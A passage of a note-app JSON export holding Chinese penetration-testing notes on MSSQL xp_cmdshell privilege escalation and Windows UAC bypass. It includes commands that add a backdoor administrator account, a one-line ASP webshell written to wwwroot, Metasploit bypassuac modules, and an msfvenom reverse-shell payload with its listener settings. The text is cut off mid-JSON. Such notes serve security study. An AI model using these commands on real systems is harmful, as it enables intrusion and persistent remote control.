is_srvrolemember('sysadmin')   判断当前是否为sa.如果返回值为1，则表示是sysadmin角色的成员；如果返回值为0，则表示不是。\nselect is_srvrolemember('public')     判断是否有public权限，public具有最低权限\nselect is_srvrolemember('db_owner')   判断当前用户写文件、读文件的权限\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241030143455-kd2vdoq","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241030143455-kd2vdoq","updated":"20241030143455"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241030143455-ygncmil.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20241030143632-tuxer5s","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241030143632-tuxer5s","updated":"20241030143805"},"Children":[{"Type":"NodeText","Data":"​​​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241030143805-g3ogq5e.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​​​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241030143731-geo0jey.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241030143748-u1pn89h.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​​​"}]},{"ID":"20241029154826-09lvuxr","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029154826-09lvuxr","updated":"20241029155125"},"Children":[{"Type":"NodeText","Data":"3.查看数据库中"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"是否有 xp_cmdshell 扩展存储插件"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"，返回值为"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"1"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"则说明该数据库中"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"有插件"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"}]},{"ID":"20241029155108-8a7fsrb","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241029155108-8a7fsrb","updated":"20241029155143"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell';\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241030144118-6ymi469","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241030144118-6ymi469","updated":"20241030144118"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241030144118-0wrlogu.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20241029155150-62w2m80","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029155150-62w2m80","updated":"20241029155200"},"Children":[{"Type":"NodeText","Data":"4.执行命令"}]},{"ID":"20241029155200-bf8sa5j","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241029155200-bf8sa5j","updated":"20241030144217"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"exec xp_cmdshell 'net user guawa 123.com /add';               //添加用户ichunqiu，密码123.com\nexec xp_cmdshell 'net localgroup administrators guawa /add';  //添加ichungiu到管理员组\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241030144152-pwwtjaj","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241030144152-pwwtjaj","updated":"20241030144229"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241030144152-1qevpwh.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241030144229-32e14le.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​​"}]},{"ID":"20241029155809-ai1104l","Type":"NodeHeading","HeadingLevel":6,"Properties":{"fold":"1","heading-fold":"1","id":"20241029155809-ai1104l","updated":"20241029155828"},"Children":[{"Type":"NodeText","Data":"🌰栗子"}]},{"ID":"20241029155831-31dg2mm","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029155831-31dg2mm","updated":"20241029155857"},"Children":[{"Type":"NodeText","Data":"目标网站asp+sqlserver"}]},{"ID":"20241029155903-bd0f5et","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029155903-bd0f5et","updated":"20241029155903"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241029155903-ohlrrh5.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20241029155906-6k539eo","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029155906-6k539eo","updated":"20241029155937"},"Children":[{"Type":"NodeText","Data":"这里使用sqlmap --os-shell去查看权限"}]},{"ID":"20241029155944-cpwl08d","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029155944-cpwl08d","updated":"20241029155944"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241029155944-08ews2b.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20241029155948-gnblt1k","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029155948-gnblt1k","updated":"20241029160139"},"Children":[{"Type":"NodeText","Data":"访问页面报错获得web路径c:\\inetpub\\wwwroot\\info.aspx.cs"}]},{"ID":"20241029160019-tts01ak","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029160019-tts01ak","updated":"20241029160019"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241029160019-g35yx0n.png"},{"Type":"NodeCloseParen"}]}]},{"ID":"20241029160031-cez2fla","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029160031-cez2fla","updated":"20241029160205"},"Children":[{"Type":"NodeText","Data":"尝试写入一句话木马,蚁剑连接获取账密"}]},{"ID":"20241029160048-tpkh4ev","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241029160048-tpkh4ev","updated":"20241029160130"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"echo \"\u003c%eval request(\"777\")%\u003e\" \u003ec:\\inetpub\\wwwroot\\test.asp\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241029160151-8fx8m1v","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029160151-8fx8m1v","updated":"20241029160151"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241029160151-jj47snw.png"},{"Type":"NodeCloseParen"}]}]},{"ID":"20241029160207-515wv2k","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029160207-515wv2k","updated":"20241029160224"},"Children":[{"Type":"NodeText","Data":"尝试xp_cmdshell提权"}]},{"ID":"20241029160233-z2q1yp4","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029160233-z2q1yp4","updated":"20241029160250"},"Children":[{"Type":"NodeText","Data":"\t查看是否开启xp_cmdshell，返回值为1开启"}]},{"ID":"20241029160250-2sqogp5","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241029160250-2sqogp5","updated":"20241029160313"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell';\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241029160324-1l61bvh","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029160324-1l61bvh","updated":"20241029160327"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Properties":{"parent-style":"width: 25%;","style":"width: 10000px;"},"Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241029160324-pvnqti1.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"width: 10000px;\" parent-style=\"width: 25%;\"}"},{"Type":"NodeText","Data":"​"}]},{"ID":"20241029160315-yhqcdm5","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029160315-yhqcdm5"}},{"ID":"20241029160315-65dtzdw","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029160315-65dtzdw","updated":"20241029160339"},"Children":[{"Type":"NodeText","Data":"\t通过 xp_cmdshell 执行系统命令，査看为system权限，并将用户加入管理组提权成功"}]},{"ID":"20241029160347-ffm0bc3","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241029160347-ffm0bc3","updated":"20241030144308"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"exec xp_cmdshell 'whoami'\nexec xp_cmdshell \"net localgroup administrators\"\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241030144319-i1s4c0p","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241030144319-i1s4c0p","updated":"20241030144339"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241030144319-v2bmzy0.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241030144339-8ubnbtp.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​​"}]},{"ID":"20241029160442-fj8x1gt","Type":"NodeHeading","HeadingLevel":6,"Properties":{"fold":"1","heading-fold":"1","id":"20241029160442-fj8x1gt","updated":"20241029160442"},"Children":[{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"strong text","TextMarkTextContent":"如果xp_cmdshell打不开--三种情况"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"}]},{"ID":"20241029160633-tqs81eg","Type":"NodeList","ListData":{},"Properties":{"fold":"1","heading-fold":"1","id":"20241029160633-tqs81eg","updated":"20241029161013"},"Children":[{"ID":"20241029160646-0glq4tw","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20241029160646-0glq4tw","updated":"20241029160646"},"Children":[{"ID":"20241029160647-2u97j5h","Type":"NodeParagraph","Properties":{"id":"20241029160647-2u97j5h","updated":"20241029160647"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeTextMark","TextMarkType":"code","TextMarkTextContent":"xp_cmdshell"},{"Type":"NodeText","Data":"​​ 被禁用"}]}]},{"ID":"20241029160650-nmqnow6","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20241029160650-nmqnow6"},"Children":[{"ID":"20241029160650-iahw7rv","Type":"NodeParagraph","Properties":{"id":"20241029160650-iahw7rv","updated":"20241029161005"},"Children":[{"Type":"NodeText","Data":"权限不足"}]}]},{"ID":"20241029161005-8z8pri2","Type":"NodeListItem","ListData":{"BulletChar":42,"Marker":"Kg=="},"Properties":{"id":"20241029161005-8z8pri2","updated":"20241029161013"},"Children":[{"ID":"20241029161005-by2wvmg","Type":"NodeParagraph","Properties":{"id":"20241029161005-by2wvmg","updated":"20241029161013"},"Children":[{"Type":"NodeText","Data":"版本不支持或被修改"}]}]}]},{"ID":"20241028140556-8vadx9c","Type":"NodeHeading","HeadingLevel":2,"Properties":{"fold":"1","id":"20241028140556-8vadx9c","updated":"20241028140602"},"Children":[{"Type":"NodeText","Data":"Bypass UAC"}]},{"ID":"20241028141315-6pnlkw9","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241028141315-6pnlkw9","updated":"20241029163429"},"Children":[{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"strong text","TextMarkTextContent":"UAC作用+绕过"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"}]},{"ID":"20241029163441-uajxb7l","Type":"NodeBlockquote","Properties":{"fold":"1","heading-fold":"1","id":"20241029163441-uajxb7l","updated":"20241029163531"},"Children":[{"ID":"20241028140607-gxrnmge","Type":"NodeParagraph","Properties":{"id":"20241028140607-gxrnmge","updated":"20241029163434"},"Children":[{"Type":"NodeText","Data":"UAC Windows Vista以后版本引入的一种"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"安全机制"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"}]},{"ID":"20241029163448-vxfw5ms","Type":"NodeParagraph","Properties":{"id":"20241029163448-vxfw5ms","updated":"20241029163448"},"Children":[{"Type":"NodeText","Data":"通过UAC，应用程序和任务可以在非管理员帐户的安全上下文中运行，除非管理员特别授予管理员级别的系统访问权限"}]},{"ID":"20241029163448-islk63c","Type":"NodeParagraph","Properties":{"id":"20241029163448-islk63c","updated":"20241029163448"},"Children":[{"Type":"NodeText","Data":"UAC 可以阻止未经授权的应用程序自动进行安装，并防止无意中更改系统设置"}]},{"ID":"20241029163514-08c5ygi","Type":"NodeParagraph","Properties":{"id":"20241029163514-08c5ygi"}},{"ID":"20241029163515-98ji61i","Type":"NodeParagraph","Properties":{"id":"20241029163515-98ji61i","updated":"20241029163531"},"Children":[{"Type":"NodeText","Data":"1.进程"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"已经"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"拥有管理权限控制 2.进程"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"被"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"用户"},{"Type":"NodeTextMark","Properties":{"style":"color: var(--b3-font-color9);"},"TextMarkType":"text","TextMarkTextContent":"允许"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"color: var(--b3-font-color9);\"}"},{"Type":"NodeText","Data":"通过管理员权限运行"}]},{"ID":"20241029163453-w5w9932","Type":"NodeParagraph","Properties":{"id":"20241029163453-w5w9932","updated":"20241029163454"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241028140704-knjdg1o.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"Type":"NodeBlockquoteMarker","Data":"\u003e"}]},{"ID":"20241028141030-3y8zet0","Type":"NodeHeading","HeadingLevel":5,"Properties":{"fold":"1","heading-fold":"1","id":"20241028141030-3y8zet0","updated":"20241029163601"},"Children":[{"Type":"NodeText","Data":"UAC四种设置要求"}]},{"ID":"20241029163613-yhrfq5y","Type":"NodeList","ListData":{"Typ":1},"Properties":{"fold":"1","heading-fold":"1","id":"20241029163613-yhrfq5y","updated":"20241029164137"},"Children":[{"ID":"20241029163613-a12oz2v","Type":"NodeListItem","ListData":{"Typ":1,"Delimiter":46,"Marker":"MS4=","Num":1},"Properties":{"id":"20241029163613-a12oz2v"},"Children":[{"ID":"20241029163602-pyfemxx","Type":"NodeParagraph","Properties":{"id":"20241029163602-pyfemxx","updated":"20241029164040"},"Children":[{"Type":"NodeText","Data":"始终通知--最严格"}]},{"ID":"20241029164057-3wqilp1","Type":"NodeParagraph","Properties":{"id":"20241029164057-3wqilp1","updated":"20241029164057"},"Children":[{"Type":"NodeText","Data":"当有程序需要使用高级别的权限时都会提示本地用户"}]}]},{"ID":"20241029163658-e4qgpup","Type":"NodeListItem","ListData":{"Typ":1,"Delimiter":46,"Marker":"Mi4=","Num":2},"Properties":{"id":"20241029163658-e4qgpup"},"Children":[{"ID":"20241029163658-926qf8x","Type":"NodeParagraph","Properties":{"id":"20241029163658-926qf8x","updated":"20241029163831"},"Children":[{"Type":"NodeText","Data":"仅在应用尝试更改我的计算机时通知我"}]},{"ID":"20241029164059-gmjsabr","Type":"NodeParagraph","Properties":{"id":"20241029164059-gmjsabr","updated":"20241029164115"},"Children":[{"Type":"NodeText","Data":"UAC默认设置\n当第三方程序要使用高级别的权限时，会提示本地用户"}]}]},{"ID":"20241029163713-p44d5lt","Type":"NodeListItem","ListData":{"Typ":1,"Delimiter":46,"Marker":"My4=","Num":3},"Properties":{"id":"20241029163713-p44d5lt"},"Children":[{"ID":"20241029163713-pjrxrjo","Type":"NodeParagraph","Properties":{"id":"20241029163713-pjrxrjo","updated":"20241029163848"},"Children":[{"Type":"NodeText","Data":"仅当应用尝试更改我的计算机时通知我"}]},{"ID":"20241029164123-16aamgg","Type":"NodeParagraph","Properties":{"id":"20241029164123-16aamgg","updated":"20241029164126"},"Children":[{"Type":"NodeText","Data":"与上一条设置要求相同，但是在提示用户时不降低桌面亮度"}]}]},{"ID":"20241029163850-vvkoqrn","Type":"NodeListItem","ListData":{"Typ":1,"Delimiter":46,"Marker":"NC4=","Num":4},"Properties":{"id":"20241029163850-vvkoqrn","updated":"20241029164137"},"Children":[{"ID":"20241029163850-v5x7zq0","Type":"NodeParagraph","Properties":{"id":"20241029163850-v5x7zq0","updated":"20241029163854"},"Children":[{"Type":"NodeText","Data":"从不提示"}]},{"ID":"20241029164136-90lbkvj","Type":"NodeParagraph","Properties":{"id":"20241029164136-90lbkvj","updated":"20241029164137"},"Children":[{"Type":"NodeText","Data":"当用户为系统管理员时，所有程序都会以最高权限运行"}]}]}]},{"ID":"20241028140743-2t7ifym","Type":"NodeHeading","HeadingLevel":5,"Properties":{"fold":"1","heading-fold":"1","id":"20241028140743-2t7ifym","updated":"20241028140946"},"Children":[{"Type":"NodeText","Data":"触发UAC"}]},{"ID":"20241029164230-wo3uy94","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029164230-wo3uy94","updated":"20241029164230"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241029164230-nu3yf3c.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20241029164150-3p42y7b","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029164150-3p42y7b","updated":"20241029164211"},"Children":[{"Type":"NodeText","Data":"UAC需要授权的动作包括"}]},{"ID":"20241029164213-ueclot5","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029164213-ueclot5","updated":"20241029164321"},"Children":[{"Type":"NodeText","Data":"配置Windows Update、增加或删除用户账户、改变用户的账户类型、改变UAC设置、用户帐户控制、安装ActiveX、安装或移除程序、安装设备驱动程序、设置家长控制、将文件移动或复制到Program Files或Windows目录、查看其他用户文件夹"}]},{"ID":"20241028140947-xk8c8gw","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241028140947-xk8c8gw","updated":"20241028140947"},"Children":[{"Type":"NodeText","Data":"​​"}]},{"ID":"20241028141100-qvne97c","Type":"NodeHeading","HeadingLevel":4,"Properties":{"fold":"1","heading-fold":"1","id":"20241028141100-qvne97c","updated":"20241028141144"},"Children":[{"Type":"NodeText","Data":"美少妇的bypassuac模块"}]},{"ID":"20241029164430-cwrd5r6","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029164430-cwrd5r6","updated":"20241029164748"},"Children":[{"Type":"NodeText","Data":"前提：在获取目标主机meterpreter shell且权限为普通用户权限的前提下提权(getsystem提权失败就可以考虑使用bypass去绕过)"}]},{"ID":"20241029164533-6x55muv","Type":"NodeHeading","HeadingLevel":5,"Properties":{"fold":"1","heading-fold":"1","id":"20241029164533-6x55muv","updated":"20241029164537"},"Children":[{"Type":"NodeText","Data":"MSF模块"}]},{"ID":"20241029164540-mop64ar","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241029164540-mop64ar","updated":"20241029164702"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"exploit/windows/local/bypassuac                       //模块将通过进程注入，利用受信任的发布者证书绕过Windows UAC，它将为我们生成另一个关闭UAC的shell\nexploit/windows/local/bypassuac_injection (内存注入)   //模块直接运行在内存的反射DLL中，不会接触目标机的硬盘，从而降低了被杀毒软件检测出来的概率\nexploit/windows/local/bypassuac_eventvwr              //模块通过在当前用户配置单元下劫持注册表中的特殊键，在启动Windows fodhelper.exe应用程序时调用的自定义命令来绕过Windows 10 UAC\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241028141628-ujgwv9u","Type":"NodeHeading","HeadingLevel":5,"Properties":{"fold":"1","heading-fold":"1","id":"20241028141628-ujgwv9u","updated":"20241029164809"},"Children":[{"Type":"NodeText","Data":"步骤"}]},{"ID":"20241029164841-9wv3sdw","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029164841-9wv3sdw","updated":"20241029164853"},"Children":[{"Type":"NodeText","Data":"进入msf，生成payload"}]},{"ID":"20241029164841-vxslgcn","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241029164841-vxslgcn","updated":"20241029164841"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"msfvenom  -p windows/meterpreter/reverse_tcp lhost=192.168.124.128  lport=12345 -f exe \u003es.exe  \n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241029164841-ijoesqa","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029164841-ijoesqa","updated":"20241029164841"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241028181208-1oljsw3.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20241029164841-u47r7yd","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029164841-u47r7yd","updated":"20241029164841"},"Children":[{"Type":"NodeText","Data":"将文件上传到目标机中，远程运行文件"}]},{"ID":"20241029164841-p770fvi","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029164841-p770fvi","updated":"20241029164841"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241028181158-q7gifkg.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20241029164841-bjeanbw","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029164841-bjeanbw","updated":"20241029164841"},"Children":[{"Type":"NodeText","Data":"使用multi/handler进行监听"}]},{"ID":"20241029164841-ans0u71","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241029164841-ans0u71","updated":"20241029164841"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"set lhost 192.168.61.17\nset lport 12345\nset payload windows/meterpreter/reverse_tcp  \nrun\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241029164841-9zyojma","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029164841-9zyojma","updated":"20241029164841"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241028182933-pm0mfst.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20241029164841-14xdi8a","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029164841-14xdi8a","updated":"20241029164841"}},{"ID":"20241029164841-gf335g3","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241029164841-gf335g3","updated":"20241029164841"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"Nod